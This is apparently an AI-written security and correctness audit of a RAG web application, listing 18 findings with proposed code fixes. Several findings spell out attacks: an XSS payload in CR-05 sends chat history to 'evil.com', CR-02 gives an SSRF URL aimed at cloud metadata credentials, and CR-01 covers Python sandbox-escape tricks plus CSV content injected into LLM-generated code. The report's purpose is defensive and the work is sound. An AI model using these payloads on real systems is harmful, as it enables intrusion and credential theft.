---
phase: final-production-audit
reviewed: 2026-06-11T00:00:00Z
depth: deep
files_reviewed: 38
files_reviewed_list:
  - backend/api.py
  - backend/session_manager.py
  - core/shared_services.py
  - core/adaptive_db.py
  - architectures/hybrid_rag.py
  - architectures/graph_rag.py
  - architectures/agentic_rag.py
  - architectures/corrective_rag.py
  - architectures/multimodal_rag.py
  - architectures/multilingual_rag.py
  - architectures/rag_fusion.py
  - architectures/hyde_rag.py
  - architectures/structured_rag.py
  - architectures/self_rag.py
  - frontend/app/page.tsx
  - frontend/app/layout.tsx
  - frontend/lib/api.ts
  - frontend/lib/types.ts
  - frontend/components/ApiKeyModal.tsx
  - frontend/components/ArchCard.tsx
  - frontend/components/ArchExplainer.tsx
  - frontend/components/AnalyticsDashboard.tsx
  - frontend/components/BrainWorking.tsx
  - frontend/components/ChatMessage.tsx
  - frontend/components/CompareGrid.tsx
  - frontend/components/DocumentManager.tsx
  - frontend/components/EvalScorecard.tsx
  - frontend/components/MarkdownContent.tsx
  - frontend/components/Sidebar.tsx
  - frontend/components/SourcePanel.tsx
  - requirements.txt
  - docker-compose.yml
  - .gitignore
  - frontend/package.json
  - frontend/next.config.mjs
  - frontend/tsconfig.json
  - frontend/tailwind.config.ts
findings:
  critical: 5
  warning: 9
  info: 4
  total: 18
status: issues_found
---

# Final Production Audit — Code Review Report

**Reviewed:** 2026-06-11
**Depth:** deep (cross-file call chains, data flow, import graph)
**Files Reviewed:** 38
**Status:** issues_found

## Summary

All 38 source files were read and cross-referenced. Previous audits fixed 77 issues across 9 sessions. This pass finds 5 critical issues and 9 warnings that remain. The most severe are: (1) an incomplete `eval()` sandbox in Structured RAG that is bypassable via Python's object hierarchy, (2) SSRF via DNS-rebinding that bypasses the existing hostname IP check, (3) an infinite-loop/stream-hang in the SSE generator when the worker thread finishes without emitting a `done` event, (4) a crash-level `UnboundLocalError` in Self-RAG under a specific loop exit path, and (5) a stored-XSS vector via the knowledge graph iframe using `allow-same-origin`. Warnings cover thread-safety gaps on shared session state, missing null-guards on ChromaDB results, EventSource memory leaks, and oversized ChromaDB metadata for images.

---

## Critical Issues

### CR-01: Structured RAG `eval()` Sandbox Bypass via Python Object Hierarchy

**File:** `architectures/structured_rag.py:109-119`

**Issue:** The pandas code sandbox at line 119 uses `eval(code, {"__builtins__": None}, {"df": df, "pd": pd})`. Passing `{"__builtins__": None}` as globals does NOT prevent sandbox escape in CPython. The expression `().__class__.__bases__[0].__subclasses__()` enumerates every loaded class and reaches `subprocess.Popen`, `os._wrap_close`, and `io.FileIO` — none of which require `import`. The string-pattern denylist (lines 109-114) blocks `import`, `exec`, and explicit `__` in code, but a multi-line LLM response has only its **first line** checked (line 101: `code = code.split("\n")[0].strip()`). An LLM output where line 0 is benign (`df`) and the attack is in subsequent lines is silently truncated to line 0 — harmless in that case — but attribute chains like `df.__class__` are `str`-checked by `"__" in code` which DOES catch them. The real remaining gap: the LLM may generate `getattr(df, chr(95)*2 + "class" + chr(95)*2)` which contains no literal `__` but accesses `__class__`. Additionally, `breakpoint` is in the denylist but `breakpointhook` is not; Python 3.12+ exposes `sys.breakpointhook` via `pd` → `pd.io` → ... traversal paths.

In practice the most important attack surface is: a malicious CSV document whose column names contain an injection payload that the LLM incorporates into the generated pandas expression. This is a real threat when arbitrary user documents are uploaded.

**Fix:** Replace string-pattern checking with AST-level analysis. Block any AST node that accesses attributes beginning with `_`, and restrict the allowed node set:

```python
import ast

_ALLOWED_NODES = frozenset({
    ast.Expression, ast.Call, ast.Attribute, ast.Subscript,
    ast.Name, ast.Constant, ast.List, ast.Tuple, ast.Dict,
    ast.BinOp, ast.UnaryOp, ast.Compare, ast.BoolOp, ast.IfExp,
    ast.Add, ast.Sub, ast.Mult, ast.Div, ast.Mod, ast.Pow,
    ast.FloorDiv, ast.Eq, ast.NotEq, ast.Lt, ast.LtE,
    ast.Gt, ast.GtE, ast.And, ast.Or, ast.Not, ast.USub,
    ast.Load, ast.Index,  # Index removed in Python 3.9 but harmless
})

def _ast_safe_eval(code: str, df, pd):
    try:
        tree = ast.parse(code, mode='eval')
    except SyntaxError as e:
        raise ValueError(f"Syntax error in generated expression: {e}")
    for node in ast.walk(tree):
        if type(node) not in _ALLOWED_NODES:
            raise ValueError(f"Disallowed AST node type: {type(node).__name__}")
        if isinstance(node, ast.Attribute) and node.attr.startswith('_'):
            raise ValueError(f"Private/dunder attribute access forbidden: {node.attr}")
    return eval(compile(tree, '<expr>', 'eval'), {"__builtins__": {}}, {"df": df, "pd": pd})
```

Replace line 119 with `result = _ast_safe_eval(code, df, pd)` and remove the `_FORBIDDEN` string-pattern block.

---

### CR-02: SSRF via DNS Rebinding — Hostname IP Check Is Bypassed by Domain Names

**File:** `backend/api.py:74-80`

**Issue:** The SSRF guard at lines 74-80 only blocks URL hostnames that are **IP address literals** resolving to private/loopback ranges. When the hostname is a domain name (e.g., `metadata.internal`, `169.254.169.254.nip.io`, any attacker-controlled domain pointing to `169.254.169.254`), the code falls through at line 80 (`pass  # hostname, not IP literal`) and `urlopen` resolves DNS at connection time, reaching internal addresses. On AWS, `http://169.254.169.254.attacker.com/latest/meta-data/iam/security-credentials/` trivially exfiltrates instance credentials because `169.254.169.254.attacker.com` has an A record pointing to `169.254.169.254`.

The current guard is useful only against naive submissions of literal IP strings. It provides no protection against the standard DNS-rebinding attack pattern.

**Fix:** Resolve the hostname before making the request and validate every returned IP:

```python
import socket

def fetch_url_text(url: str) -> str:
    from urllib.parse import urlparse
    import ipaddress

    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise HTTPException(status_code=400, detail="Only http and https URLs are supported")
    host = parsed.hostname or ""
    if not host:
        raise HTTPException(status_code=400, detail="Could not parse hostname")

    # Resolve DNS and reject any address in private/internal space
    try:
        addr_infos = socket.getaddrinfo(host, None)
        for *_, sockaddr in addr_infos:
            ip_str = sockaddr[0]
            try:
                addr = ipaddress.ip_address(ip_str)
                if addr.is_private or addr.is_loopback or addr.is_link_local or addr.is_reserved:
                    raise HTTPException(
                        status_code=400,
                        detail=f"URL resolves to a private/internal address: {ip_str}"
                    )
            except ValueError:
                pass
    except socket.gaierror as e:
        raise HTTPException(status_code=400, detail=f"DNS resolution failed: {e}")

    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=15) as resp:
        html = resp.read().decode("utf-8", errors="replace")
    # ... rest unchanged
```

---

### CR-03: SSE Generator Infinite Loop / Stream Hang When Thread Dies Without Emitting `done`

**File:** `backend/api.py:384-419`

**Issue:** The `event_generator` drain path at line 419 ends with `break` (not `return`). After the inner drain `while True` loop runs to empty (line 391 `break`), control falls to line 419 which `break`s out of — the inner drain loop (not the outer `while True`). This means the outer `while True` at line 336 is re-entered. Since `thread.is_alive()` is now `False` and the queue is empty, the outer loop immediately hits `Empty` again, re-enters the `if not thread.is_alive()` branch, runs the drain loop again (immediately empty), hits `break` at line 419 again... and this repeats indefinitely. The SSE connection hangs open with zero events emitted, consuming the async event loop.

This scenario is triggered whenever the pipeline thread terminates abruptly (exception, timeout, or kill) before placing any event in the queue, which can happen if `services.llm` raises at the start of a query (no API key, Groq rate limit, network timeout).

Separately: if the `done` event IS emitted and consumed by the fast path (lines 364-382), that path correctly `break`s the outer loop. But if `done` arrives during the drain path (lines 400-404), the history and analytics are recorded and `return` is called correctly. So the double-write described in some previous review notes does not occur in practice — but the infinite-loop on no-event-at-all does.

**Fix:** Change line 419 from `break` to `return`, and add a final `return` after the inner drain loop to handle the "queue empty, thread dead, no done received" case:

```python
except Empty:
    if not thread.is_alive():
        # Drain residual events
        while True:
            try:
                event = q.get_nowait()
            except Empty:
                return  # FIX: was `break` — caused re-entry of outer loop
            kind, content = event
            # ... handle event ...
            yield f"data: {payload}\n\n"
            if kind in ("done", "error"):
                if kind == "done":
                    session.history.append(...)
                    adaptive_db.store_query_analytics(...)
                    if collected_answer and query_embedding:
                        try:
                            adaptive_db.store_query_cache(...)
                        except Exception as e:
                            print(f"[cache] store_query_cache failed: {e}")
                return
        # Unreachable after fix, but kept for clarity:
        return
    await asyncio.sleep(0.01)
```

---

### CR-04: `gen_prompt` UnboundLocalError Crash in Self-RAG

**File:** `architectures/self_rag.py:240-244`

**Issue:** `gen_prompt` is defined inside the `for loop in range(MAX_LOOPS)` block at line 196. The code at lines 240-244 (after the loop) references `gen_prompt` unconditionally. Python does not raise on unbound loop variables if the loop ran at least one iteration and the assignment was reached. However there is a specific path where the assignment is NOT reached:

1. `loop == 0`, `new_docs` is non-empty after deduplication.
2. Relevance grading returns all `False` (zero relevant docs).
3. `rel_docs = []`, so `all_docs` remains empty from initialization.
4. `if not all_docs:` block at line 176 runs.
5. `web_search_fallback` returns an empty list (DuckDuckGo down or no results).
6. `return "No relevant information found..."` — exits before `gen_prompt` is assigned.

In this case the function returns correctly (line 183). BUT: change `MAX_LOOPS` to 1 (or if the loop range is 0 for any reason), the post-loop code at line 240 runs with `gen_prompt` unbound → `UnboundLocalError: local variable 'gen_prompt' referenced before assignment`.

Additionally, at line 243 the post-loop `services.stream_llm(gen_prompt, ...)` call references `gen_prompt` which was last assigned in loop iteration 0 but refers to context built from `all_docs[:5]` at that point. After the second loop adds more docs to `all_docs`, the prompt at line 196 is rebuilt — so `gen_prompt` in the post-loop fallback uses the *last iteration's* prompt, which already incorporates the refined docs. This is actually correct behavior, but only because Python closures capture by reference. It's fragile: a reader would not expect the post-loop variable to reflect loop-interior state.

**Fix:** Initialize `gen_prompt` before the loop and add a guard:

```python
gen_prompt = ""
draft_answer = ""

for loop in range(MAX_LOOPS):
    ...
    gen_prompt = f"""..."""  # assigned as before
    ...

# Post-loop fallback
if draft_answer and gen_prompt:
    step("Streaming best available answer…")
    return services.stream_llm(
        gen_prompt, on_token=lambda t: on_step and on_step(("token", t))
    )
return "Unable to generate a satisfactory answer for this query."
```

---

### CR-05: Knowledge Graph Iframe `sandbox="allow-scripts allow-same-origin"` Enables Stored XSS

**File:** `frontend/app/page.tsx:413`

**Issue:** The graph HTML is rendered in an iframe with `sandbox="allow-scripts allow-same-origin"`. The `allow-same-origin` flag grants the iframe the **same origin** as the parent page. Combined with `allow-scripts`, JavaScript inside the iframe can:
- Call `window.parent.localStorage.getItem('rag-studio-messages')` to read the full chat history (which may contain sensitive document excerpts).
- Call `window.parent.fetch(...)` to make authenticated same-origin API calls.
- Modify `window.parent.document` to inject UI elements.

The graph HTML is generated by PyVis from LLM-extracted entity/relationship triples. Entity and relationship names come from user-uploaded documents. PyVis renders node labels and edge `title` attributes as raw HTML in its `vis.js` output. An attacker who uploads a document containing an entity named `<img src=x onerror="fetch('https://evil.com/'+btoa(window.parent.localStorage.getItem('rag-studio-messages')))">` would have that string embedded in the PyVis HTML, which executes in the iframe with same-origin privileges and exfiltrates the chat history.

**Fix:** Remove `allow-same-origin`. With only `allow-scripts`, the iframe runs in a null origin and cannot access parent context:

```tsx
<iframe
  srcDoc={graphHtml}
  className="flex-1 w-full border-0"
  sandbox="allow-scripts"
  title="Knowledge Graph"
/>
```

Note: PyVis's vis.js physics simulation requires only `allow-scripts` to function. `allow-same-origin` is not needed for the graph to render.

---

## Warnings

### WR-01: `session.history`, `session.doc_library`, and `session.ingested_archs` Mutated Without Locks

**File:** `backend/api.py:264, 270, 366, 411, 626-633` / `backend/session_manager.py:126-154`

**Issue:** `GlobalSession`'s `history` (list), `doc_library` (list), and `ingested_archs` (set) are plain Python collections mutated from multiple concurrent paths: the `/api/ingest` async endpoint, the SSE worker thread via `run_pipeline`, and the `/api/compare` endpoint which spawns 10 threads simultaneously. The GIL protects individual bytecode operations but not compound operations like `list.append` interleaved with `list[-20:]` or `session.doc_library = [d for d in ...]` (line 626). Specifically:

- `/api/compare` spawns 10 threads; each calls `pipeline.query()` which puts `done` events in the queue; the SSE generator appends to `session.history` from the async loop. Two concurrent queries can have their history entries interleaved.
- `session.doc_library = [...]` at line 626 (delete endpoint) is a wholesale reassignment that races with `session.doc_library.append(...)` at line 270 (ingest endpoint).

**Fix:** Add a `threading.Lock` to `GlobalSession` and gate all mutations:

```python
class GlobalSession:
    def __init__(self):
        self._state_lock = threading.Lock()
        ...

    def append_history(self, entry: dict):
        with self._state_lock:
            self.history.append(entry)

    def add_ingested_arch(self, arch_key: str):
        with self._state_lock:
            self.ingested_archs.add(arch_key)

    def append_doc(self, doc: dict):
        with self._state_lock:
            self.doc_library.append(doc)

    def filter_doc_library(self, predicate):
        with self._state_lock:
            self.doc_library = [d for d in self.doc_library if predicate(d)]
```

---

### WR-02: `AdaptiveDB` Read Methods Execute Without Lock on Shared SQLite Connection

**File:** `core/adaptive_db.py:67-120, 149-154, 186-222, 224-239, 263-271`

**Issue:** All write methods (`store_feedback`, `store_query_cache`, `store_query_analytics`, `store_eval_analytics`) acquire `self._lock` correctly. However all read methods (`find_similar_query`, `get_positive_sources`, `get_cache_count`, `get_analytics`, `get_feedback_docs`, `get_recent_queries`) access `self.conn` without the lock. The connection is a single `sqlite3.Connection` created with `check_same_thread=False`. SQLite connections are not thread-safe for concurrent access from multiple threads on the same connection object — `check_same_thread=False` disables the check, not the underlying unsafety. Under `/api/compare` mode (10 concurrent threads), 10 simultaneous `find_similar_query` reads interleaved with `store_query_analytics` writes on the same connection will produce `sqlite3.OperationalError: database is locked` or cursor corruption.

**Fix:** Wrap all read operations in `with self._lock:`, or use a connection-per-thread pattern with `threading.local()`:

```python
def find_similar_query(self, query_embedding, arch_key, threshold=0.92):
    with self._lock:
        rows = self.conn.execute(
            "SELECT query_text, query_embedding, answer, sources FROM query_cache "
            "WHERE arch_key = ? ORDER BY ts DESC LIMIT 100",
            (arch_key,),
        ).fetchall()
    # Pure Python cosine similarity computation — outside lock is fine
    if not rows:
        return None
    ...
```

Apply the same `with self._lock:` pattern to all other read methods that call `self.conn`.

---

### WR-03: EventSource Leaked After Successful Query / No Cleanup on Unmount

**File:** `frontend/lib/api.ts:54-66` / `frontend/app/page.tsx:53, 182`

**Issue:** `streamQuery` returns a cleanup function that calls `es.close()`. This function is stored in `cleanupRef.current` at line 182. However `cleanupRef.current` is never called — there is no `useEffect` that invokes it on component unmount or on re-render. If the user submits a new query while a previous stream is still open (which the `isStreaming` guard prevents in single-arch mode, but not in compare mode), the old EventSource is never closed.

More critically, `EventSource` has native reconnect behavior. After the server closes the SSE stream on `done`, the browser will attempt to reconnect (as per the SSE spec). The reconnect attempt fires `onerror` before `es.close()` takes effect. This means every successful query shows a brief error event. The `onError` callback in `page.tsx` appends an error message to the chat (`⚠️ Connection error — is the backend running?`) after every successful query.

**Fix 1 — Suppress post-close errors:**

```typescript
let intentionallyClosed = false

es.onmessage = (e) => {
  const d = JSON.parse(e.data)
  if (d.type === 'done') {
    intentionallyClosed = true
    callbacks.onDone(d.answer, d.elapsed, d.cached || false)
    es.close()
  } else if (d.type === 'error') {
    intentionallyClosed = true
    callbacks.onError(d.content)
    es.close()
  }
  // other cases...
}
es.onerror = () => {
  if (intentionallyClosed) return
  callbacks.onError('Connection error — is the backend running?')
  es.close()
}
```

**Fix 2 — Call cleanup on unmount:**

```typescript
// In page.tsx
useEffect(() => {
  return () => { cleanupRef.current?.() }
}, [])
```

---

### WR-04: `image_base64` in ChromaDB Metadata Exceeds Per-Field Size Limits

**File:** `architectures/multimodal_rag.py:37-42` / `backend/api.py:171-179`

**Issue:** When an image is uploaded, its full base64-encoded content is stored as a ChromaDB metadata field `image_base64`. A 1 MB image encodes to ~1.4 MB of base64. ChromaDB's default metadata value size is capped at approximately 64 KB per value. Values exceeding this limit cause ChromaDB to raise `chromadb.errors.InvalidDimensionException` or `ValueError: Metadata value too large` (exact behavior depends on ChromaDB version). The 50 MB upload limit allows images that are ~35x the metadata size limit. Even a typical phone screenshot (2-3 MB) exceeds the limit.

When the `add()` call fails, the exception is caught by the generic `try/except` in each pipeline's `__init__`, which silently recreates the collection — losing any previously ingested non-image data.

**Fix:** Store large base64 content in a sidecar file and put only the path in metadata:

```python
# In backend/api.py process_file(), image branch:
import uuid as _uuid
img_dir = os.path.join(os.path.dirname(__file__), '..', 'adaptive_data', 'images')
os.makedirs(img_dir, exist_ok=True)
img_filename = f"{_uuid.uuid4().hex}.b64"
img_path = os.path.join(img_dir, img_filename)
with open(img_path, 'w') as fh:
    fh.write(b64)
return [Document(
    page_content=f"Image Description: {summary}",
    metadata={"source": source, "type": "image", "image_path": img_path},
)]

# In multimodal_rag.py query(), loading the image:
if meta and "image_path" in meta and os.path.exists(meta["image_path"]):
    with open(meta["image_path"]) as fh:
        b64_data = fh.read()
    content.append({"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{b64_data}"}})
```

---

### WR-05: Missing Null Guard on `results["documents"][0]` in Four Architectures

**File:** `architectures/multilingual_rag.py:62` / `architectures/hyde_rag.py:84` / `architectures/self_rag.py:65` / `architectures/structured_rag.py:156`

**Issue:** All four architectures access `results["documents"][0]` directly without a null check. ChromaDB returns `results["documents"] = [[]]` (a list containing an empty list) when no results match. In that case `results["documents"][0]` is `[]` — safe. However `results["metadatas"][0]` can be `None` in some ChromaDB versions when no results exist, causing `TypeError: 'NoneType' object is not subscriptable` at the metadata access line in the same function. This unhandled exception propagates to the worker thread, which puts `("error", ...)` in the queue — but with a confusing internal error message instead of "no documents found."

Compare with `agentic_rag.py:63` and `corrective_rag.py:63` which correctly guard with `if results["documents"][0] else []`.

**Fix:** Apply the same guard used in the other pipelines:

```python
docs = results["documents"][0] if results.get("documents") and results["documents"][0] else []
metas = results["metadatas"][0] if results.get("metadatas") and results["metadatas"][0] else [{}] * len(docs)
```

Apply to: `multilingual_rag.py:62-63`, `hyde_rag.py:84-85`, `self_rag.py:65-66`, `structured_rag.py:156-157`.

---

### WR-06: `session.history` Grows Unboundedly — No Cap at Append Time

**File:** `backend/api.py:366, 411` / `backend/session_manager.py:138`

**Issue:** `session.history.append(...)` is called on every successful query. There is no size cap at append time — only a slice when returning (`session.history[-20:]` at line 575). Over a long-running server session, `session.history` will grow to hold thousands of entries. With Compare mode running all 10 architectures at once, 10 entries are added per compare query. At 1 KB per entry (query + answer[:120]), 10,000 queries = 10 MB of Python heap from history alone. More practically, in production this means the memory footprint increases monotonically until the server is restarted.

**Fix:** Cap the list at append time:

```python
MAX_HISTORY = 200

def append_to_history(entry: dict):
    session.history.append(entry)
    if len(session.history) > MAX_HISTORY:
        del session.history[:-MAX_HISTORY]  # keep most recent
```

Or enforce the cap in `GlobalSession`:

```python
def append_history(self, entry):
    with self._state_lock:
        self.history.append(entry)
        if len(self.history) > 200:
            self.history = self.history[-200:]
```

---

### WR-07: `MarkdownContent` Silently Drops Content After Unterminated Fenced Code Block

**File:** `frontend/components/MarkdownContent.tsx:96-113`

**Issue:** The fenced code block parser (lines 96-113) loops `while (i < lines.length && !lines[i].startsWith('``\`'))`. If the LLM returns a code block without a closing `` ``` `` fence (common when the LLM answer is truncated by `max_tokens=1024`), the inner loop consumes ALL remaining lines. The content after the unterminated fence is silently lost — the user sees a partial response with no warning, and crucially the final sentence (where the LLM may deliver the key answer) is never rendered.

**Fix:** Handle the case where the closing fence is not found. The current logic already advances `i` past the closing `` ``` `` at line 104 (`i++`). The fix is to not error but still render what was collected:

```typescript
if (line.startsWith('```')) {
  const lang = line.slice(3).trim()
  const codeLines: string[] = []
  i++
  while (i < lines.length && !lines[i].startsWith('```')) {
    codeLines.push(lines[i])
    i++
  }
  if (i < lines.length) {
    i++ // skip closing ``` only if it exists
    // If i === lines.length here, the fence was unterminated — we still render what we have
  }
  nodes.push(
    <pre key={nextKey()} className="bg-white/[0.05] rounded-lg p-3 overflow-x-auto my-2">
      <code className={`text-xs font-mono text-indigo-200${lang ? ` language-${lang}` : ''}`}>
        {codeLines.join('\n')}
      </code>
    </pre>
  )
  continue
}
```

This is already the correct behavior in terms of content collection. The only change is the conditional `i++` on line 104 — if `i === lines.length` after the inner loop, skipping the `i++` prevents an off-by-one that would lose the last rendered line.

---

### WR-08: `DocumentManager` Error Messages from Failed Uploads Are Silently Swallowed

**File:** `frontend/components/DocumentManager.tsx:23-35`

**Issue:** When `ingestFile` throws (e.g., 409 duplicate, 413 too large, 415 unsupported type), the `catch` block only increments `errors++` without capturing `e.message`. The summary message shows only `"${errors} failed"` with no indication of which file failed or why. The backend returns descriptive error messages (`detail` field in JSON), and the `ingestFile` function in `api.ts` correctly extracts and throws `Error(detail)`, but `DocumentManager` discards it.

**Fix:**

```typescript
const errorMessages: string[] = []
for (const file of files) {
  try {
    const res = await ingestFile(file, archKeys)
    totalChunks += res.chunks
    onIngested(res.source, res.chunks)
  } catch (e: any) {
    errors++
    errorMessages.push(`${file.name}: ${e.message || 'unknown error'}`)
  }
}
if (errors > 0) {
  setMsg(`✓ ${files.length - errors} ingested · ${errors} failed: ${errorMessages.join('; ')}`)
} else {
  setMsg(`✓ ${files.length} file${files.length > 1 ? 's' : ''} → ${totalChunks} chunks ingested`)
}
```

---

### WR-09: Concurrent Ingests to Non-Hybrid Pipelines Have ID Race Condition

**File:** `architectures/graph_rag.py:111`, `architectures/agentic_rag.py:48`, `architectures/corrective_rag.py:47`, `architectures/multimodal_rag.py:35`, `architectures/multilingual_rag.py:34`, `architectures/rag_fusion.py:40`, `architectures/hyde_rag.py:47`, `architectures/self_rag.py:54`, `architectures/structured_rag.py:62`

**Issue:** All pipelines except `hybrid_rag` compute document IDs using the pattern:

```python
existing = self.collection.count()
ids = [f"{prefix}_{uuid.uuid4().hex[:8]}_{existing + i}" for i in range(len(documents))]
```

The `self.collection.count()` + `id generation` + `self.collection.add()` sequence is not atomic. If two `/api/ingest` requests arrive concurrently (the frontend's multi-file upload loop fires them in parallel via `for file of files`), both threads call `self.collection.count()` at the same time, get the same `existing` value, and generate overlapping IDs. ChromaDB will raise `DuplicateIDError` on the second `add()` call, silently failing one of the ingests.

**Fix:** Drop the sequential counter and rely solely on `uuid4()` for uniqueness, which is guaranteed without needing a count:

```python
ids = [f"{prefix}_{uuid.uuid4().hex}" for _ in range(len(documents))]
```

Apply to all 9 affected pipelines.

---

## Info

### IN-01: `get_positive_sources` Is Dead Code — Never Called

**File:** `core/adaptive_db.py:67-78`

**Issue:** `AdaptiveDB.get_positive_sources` is defined at line 67 but has zero call sites in the entire codebase. The feedback boost uses `get_feedback_docs` instead (line 241). This dead method adds maintenance confusion about which feedback API callers should use.

**Fix:** Remove the method. If retrieval-time filtering by positive chunk IDs is desired in the future, the correct entry point is `get_feedback_docs` which returns both positive and negative sets.

---

### IN-02: `NEXT_PUBLIC_API_BASE_URL` Name Mismatch Between CI and Source Code

**File:** `.github/workflows/ci.yml:56` / `frontend/lib/api.ts:3`

**Issue:** The CI workflow sets `NEXT_PUBLIC_API_BASE_URL: http://localhost:8000` but `api.ts` reads `process.env.NEXT_PUBLIC_API_BASE` (without `_URL` suffix). The CI environment variable is never consumed, so the CI frontend always uses the fallback `http://127.0.0.1:8000`. This is harmless if CI doesn't run end-to-end tests against a live backend, but it means any CI test that verifies API URL configuration will silently pass regardless of the environment variable value.

**Fix:** Align the CI variable name with the source code:

```yaml
# In ci.yml:
NEXT_PUBLIC_API_BASE: http://localhost:8000
```

---

### IN-03: `requirements.txt` Missing `langchain-huggingface` Explicit Version Pin for Production

**File:** `requirements.txt:12`

**Issue:** `langchain-huggingface>=0.1.0` allows any future major version. The HuggingFace embedding interface changed significantly between 0.x and 1.x releases. In a production deployment with `pip install -r requirements.txt` and no lock file, a future release could break the `HuggingFaceEmbeddings` API silently.

**Fix:** Pin to a known-good minor range: `langchain-huggingface>=0.1.0,<0.2.0`. Generate a `requirements.lock` (via `pip freeze`) for production deployments.

---

### IN-04: `docker-compose.yml` Health Check Spawns a Full Python Interpreter Every 30 Seconds

**File:** `docker-compose.yml:19`

**Issue:** The health check uses `python -c "import urllib.request; urllib.request.urlopen(...)"`. On a container with limited memory, spawning a new CPython interpreter every 30 seconds for the health check adds ~30-50 MB RSS per check cycle on Python 3.12 with all packages imported (even though `urllib` alone is small, the interpreter init loads the full stdlib). This is especially wasteful if `curl` or `wget` is available in the container image.

**Fix:**

```yaml
healthcheck:
  test: ["CMD-SHELL", "curl -sf http://localhost:8000/api/health > /dev/null || exit 1"]
  interval: 30s
  timeout: 10s
  retries: 3
```

If `curl` is not available in the Dockerfile's base image (`python:3.11-slim`), add `RUN apt-get install -y --no-install-recommends curl` to the Dockerfile.

---

_Reviewed: 2026-06-11_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: deep_
